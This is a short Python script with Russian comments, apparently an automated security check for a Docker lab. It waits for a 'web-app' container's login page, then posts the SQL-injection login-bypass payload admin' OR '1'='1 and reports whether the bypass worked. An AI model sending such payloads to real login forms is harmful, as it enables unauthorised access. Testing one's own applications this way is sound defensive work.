import requests
import time
import sys



# Внутри сети Docker мы можем обращаться к контейнеру по его имени из docker-compose.yml
target_url = "http://web-app:5000/login"

# Полезная нагрузка, ломающая логику SQL-запроса (истина вместо проверки имени пользователя)
payload = {"username": "admin' OR '1'='1"}

print(f"[+] Запуск сканирования на безопасности на: {target_url}")

# Умное ожидание доступности сервиса
max_retries = 10
retries = 0
connected = False

print("[*] Ожидание инициализации сети и веб-приложения...")

while retries < max_retries:
    try:
        # Проверяем доступность простым GET-запросом
        response = requests.get(target_url, timeout=3)
        if response.status_code == 200:
            connected = True
            print("[+] Веб-приложение успешно найдено в сети! Начинаем аудит...")
            break

    except requests.exceptions.ConnectionError:
        retries += 1
        print(f"[*] Сервер ещё не готов (Попытка {retries}/{max_retries}). Ждем 2 секунды...")
        time.sleep(2)

    except Exception as e:
        print(f"[-] Непредвиденная ошибка сети: {e}")
        time.sleep(2)

if not connected:
    print("[-] Критическая ошибка: Не удалось связаться с веб-приложением. Выход.")
    sys.exit(1)

try:
    response = requests.post(target_url, data=payload, timeout=10)

    if "Успешный вход!" in response.text:
        print("[+] ВНИМАНИЕ: Обнаружена критическая уязвимость SQL-injection!")
        print(f"[!] Использован payload: {payload['username']}")

    else:
        print("[+] Сканирование завершено. Уязвимостей не обнаружено.")

except Exception as e:
    print(f"[-] ошибка при отправке эксплойта: {e}")
    